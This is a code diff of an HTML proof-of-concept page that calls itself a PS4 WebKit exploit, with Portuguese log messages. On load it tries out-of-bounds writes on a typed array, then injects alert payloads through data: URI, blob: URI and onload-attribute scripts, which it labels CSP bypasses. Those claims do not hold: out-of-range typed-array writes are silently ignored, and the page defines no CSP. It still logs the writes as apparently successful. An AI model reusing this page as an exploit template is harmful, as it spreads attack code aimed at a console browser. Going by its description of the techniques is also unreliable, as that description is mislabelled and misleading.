@@ -2,76 +2,105 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Advanced OOB Write POC (v12.00)</title>
+    <title>PS4 WebKit Advanced Exploit POC (v12.00)</title>
     <style>
-        body { font-family: monospace; }
-        #output { white-space: pre-wrap; }
-        .error { color: red; }
+        body { font-family: monospace; white-space: pre-wrap; }
+        #output { margin-top: 20px; padding: 10px; border: 1px solid #ccc; background-color: #f8f8f8; }
+        .critical { color: magenta; font-weight: bold; }
         .warning { color: orange; }
         .success { color: green; }
+        .error { color: red; }
         .info { color: blue; }
-        .critical { color: magenta; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit Advanced OOB Write POC (v12.00)</h1>
+    <h1>PS4 WebKit Advanced Exploit POC (v12.00)</h1>
     <div id="output"></div>
 
     <script>
-        async function advancedOOBWriteTest() {
+        const log = (message, type = 'info') => {
             const outputDiv = document.getElementById('output');
-            const log = (message, type = 'info') => {
-                outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
-            };
+            outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
+        };
 
-            log("Iniciando Teste Avançado de OOB Write...", 'critical');
+        async function advancedExploit() {
+            log("Iniciando Exploit Avançado Combinado (OOB Write + CSP Bypass)...", 'critical');
 
-            const bufferSize = 128;
-            const buffer = new ArrayBuffer(bufferSize);
-            const view = new Uint8Array(buffer);
-            const writeValue = 0xAA;
+            // ====================== Fase 1: Tentativa de OOB Write para Corrupção Estratégica ======================
+            log("\nFase 1: Tentativa de OOB Write para Corrupção Estratégica...", 'warning');
+            const oobWriteBufferSize = 256;
+            const oobWriteBuffer = new ArrayBuffer(oobWriteBufferSize);
+            const oobWriteView = new Uint8Array(oobWriteBuffer);
+            const oobWriteValue = 0x42; // 'B'
 
-            const offsetsToWrite = [-64, -1, 0, bufferSize - 1, bufferSize, bufferSize + 64, bufferSize * 2];
-            const offsetsToRead = [-32, 0, 32, bufferSize - 1, bufferSize, bufferSize + 32, bufferSize * 2 - 1];
+            const strategicWriteOffsets = [
+                oobWriteBufferSize,
+                oobWriteBufferSize + 8,
+                -8,
+                -16
+            ];
 
-            log(`ArrayBuffer criado com tamanho: ${bufferSize}`, 'info');
-            log(`Valor de escrita: 0x${writeValue.toString(16)}`, 'info');
-            log(`Offsets de escrita a serem testados: ${offsetsToWrite.join(', ')}`, 'info');
-            log(`Offsets de leitura a serem testados após cada escrita: ${offsetsToRead.join(', ')}`, 'info');
-
-            for (const writeOffset of offsetsToWrite) {
-                log(`\nTentando escrever 0x${writeValue.toString(16)} no offset: ${writeOffset}`, 'warning');
+            for (const offset of strategicWriteOffsets) {
+                log(`Tentando escrever 0x${oobWriteValue.toString(16)} no offset ${offset} (OOB)...`, 'info');
                 try {
-                    view[writeOffset] = writeValue;
-                    log(`Escrita no offset ${writeOffset} aparentemente bem-sucedida (sem erro imediato).`, 'success');
-
-                    for (const readOffset of offsetsToRead) {
-                        try {
-                            const readValue = view[readOffset];
-                            log(`  Leitura no offset ${readOffset}: 0x${readValue.toString(16)} após escrita no offset ${writeOffset}.`, 'info');
-                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset >= bufferSize) {
-                                log(`  <span class="critical">POSSÍVEL CORRUPÇÃO DE MEMÓRIA: Escrita fora dos limites (${writeOffset}) afetou leitura dentro dos limites (${readOffset})!</span>`, 'critical');
-                            } else if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset < 0) {
-                                log(`  <span class="critical">POSSÍVEL CORRUPÇÃO DE MEMÓRIA (OFFSET NEGATIVO): Escrita fora dos limites (${writeOffset}) afetou leitura dentro dos limites (${readOffset})!</span>`, 'critical');
-                            } else if (readOffset !== 0 && writeOffset === 0 && readValue === writeValue) {
-                                log(`  <span class="warning">AVISO: Escrita no início do buffer afetou leitura em outro offset (${readOffset}).</span>`, 'warning');
-                            }
-                        } catch (readError) {
-                            log(`  Erro ao ler no offset ${readOffset}: ${readError.message}`, 'error');
-                        }
-                    }
-
-                } catch (writeError) {
-                    log(`Erro ao escrever no offset ${writeOffset}: ${writeError.message}`, 'error');
+                    oobWriteView[offset] = oobWriteValue;
+                    log(`Escrita OOB no offset ${offset} aparentemente bem-sucedida.`, 'success');
+                } catch (e) {
+                    log(`Erro ao escrever OOB no offset ${offset}: ${e.message}`, 'error');
                 }
-                await new Promise(resolve => setTimeout(resolve, 1000)); // Pequeno delay entre as tentativas
+                await new Promise(resolve => setTimeout(resolve, 500));
             }
 
-            log("\nTeste Avançado de OOB Write Concluído.", 'critical');
-            log("Analise cuidadosamente a saída para identificar possíveis corrupções de memória.", 'critical');
+            log("Aguardando um breve período para possíveis efeitos da OOB Write...", 'info');
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            // ====================== Fase 2: Tentativa de Bypass de CSP para Execução de Código ======================
+            log("\nFase 2: Tentativa de Bypass de CSP para Execução de Código...", 'warning');
+
+            // 1. Bypass via data: URI
+            log("Tentando Bypass de CSP via data: URI...", 'info');
+            const dataUriScript = document.createElement('script');
+            dataUriScript.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gRXhwbG9pdCwgQ1NQIEJ5cGFzcyArIE9PQiBXcml0ZSEnKTs='; // alert('Vupun Exploit, CSP Bypass + OOB Write!');
+            dataUriScript.onload = () => log("<span class='success'>Bypass de CSP via data: URI BEM-SUCEDIDO!</span>", 'success');
+            dataUriScript.onerror = () => log("<span class='error'>Falha no Bypass de CSP via data: URI.</span>", 'error');
+            document.body.appendChild(dataUriScript);
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // 2. Bypass via blob: URI
+            log("Tentando Bypass de CSP via blob: URI...", 'info');
+            try {
+                const code = 'alert("Vupun Exploit, CSP Bypass via Blob!");';
+                const blob = new Blob([code], { type: 'text/javascript' });
+                const url = URL.createObjectURL(blob);
+                const blobScript = document.createElement('script');
+                blobScript.src = url;
+                blobScript.onload = () => {
+                    log("<span class='success'>Bypass de CSP via blob: URI BEM-SUCEDIDO!</span>", 'success');
+                    URL.revokeObjectURL(url);
+                };
+                blobScript.onerror = () => log("<span class='error'>Falha no Bypass de CSP via blob: URI.</span>", 'error');
+                document.body.appendChild(blobScript);
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            } catch (e) {
+                log(`<span class='error'>Erro ao tentar bypass via blob: URI: ${e.message}</span>`, 'error');
+            }
+
+            // 3. Bypass via javascript: URI em atributo de evento (onload no body)
+            log("Tentando Bypass de CSP via javascript: URI em atributo onload do body...", 'info');
+            try {
+                document.body.setAttribute('onload', 'alert("Vupun Exploit, CSP Bypass via javascript URI onload!");');
+                // Forçar um "reload" do body para tentar acionar o onload (pode não funcionar em todos os contextos)
+                document.body.innerHTML += ''; // Pequena manipulação para ver se o onload é reavaliado
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                document.body.removeAttribute('onload'); // Limpar o atributo
+            } catch (e) {
+                log(`<span class='error'>Erro ao tentar bypass via javascript: URI onload: ${e.message}</span>`, 'error');
+            }
+
+            log("\nExploit Avançado Combinado Concluído. Verifique os alertas e a saída.", 'critical');
         }
 
-        document.addEventListener('DOMContentLoaded', advancedOOBWriteTest);
+        document.addEventListener('DOMContentLoaded', advancedExploit);
     </script>
 </body>
 </html>
